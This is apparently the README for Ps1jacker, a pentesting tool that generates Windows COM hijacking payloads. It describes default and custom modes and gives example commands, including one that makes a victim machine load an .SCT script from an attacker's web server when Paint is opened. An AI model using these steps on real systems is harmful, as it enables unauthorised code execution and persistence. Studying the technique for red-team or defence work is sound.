# Ps1jacker
Ps1jacker is a tool for generating COM Hijacking payload.

![Ps1jacker screenshot](https://preview.ibb.co/hWmhD9/ps1jacker.png)

**WARNING: This tool is still in development - please report bugs!**

######  WHAT IS COM HIJACKING?
COM Hijacking is a method for an attacker to gain remote code execution or persistence on victims machine, by using legitimate Windows process'. 
The advantage of Ps1jacker is that it uses a method which allows the user to specify his/her script path on Web Server, which means there is no local
storage on victims machine involved in this process. 

######  DEFAULT METHOD [-hd]
The Default method will generate the payload for you without any of your user input. However, there are 2 precautions:
1. It will only work if you grab the file calc.SCT from examples directory and copy it to your victims machine exactly at `C:\\tools\\COM Testing\\`,
as the payload will be generated in a way, where it will expect the .SCT script to be located in that path.
2. This works only with using `MSPAINT.exe` (Paint). Meaning, victim has to open PAINT.exe in order for the payload to trigger.

Once you have done that, you can execute the powershell script on victims machine and it should generate all the registry entries for you.

######  CUSTOM METHOD [-p][-ch][-cf]
With the custom method you may specify your own .SCT script and decide whether:
1. Host it on your webserver: in this case you have to specify the path to the file on your server, eg. `http://<your_webserver_ip>/<your_sct_script>`
2. Host it on your victim's machine: in this case you specify the path where your .SCT script is residing on your victim's machine.
You also have to specify your own CLSID which you will hijack.
Same goes for the unique Fake CLSID. And remember, it has to be really unique, otherwise you will trigger an existing process in Windows instead of your
script.

######  DISCLAIMER: 
Please do not use this tool for illegal activities. This tools should be used by pentesters to ease the generation of payload for COM Hijacking technique.


######  TEST 1:
This will generate a default payload that will open Calculator instead of MSPAINT. Be sure to have calc.SCT file from Examples folder within C:\tools\COM Testing\ on victim machine. Otherwise this method wont work.

`python ./ps1jacker.py -hd`

######  TEST 2:
Hijacking MSPAINT.exe by specifing custom parameters.

`python ./ps1jacker.py -p "http://<web_server_ip>/<your_sct_file>" -ch {926749FA-2615-4987-8845-C33E65F2B957} -cf {00000001-0001-0001-0001-0000DEADBEEF}`


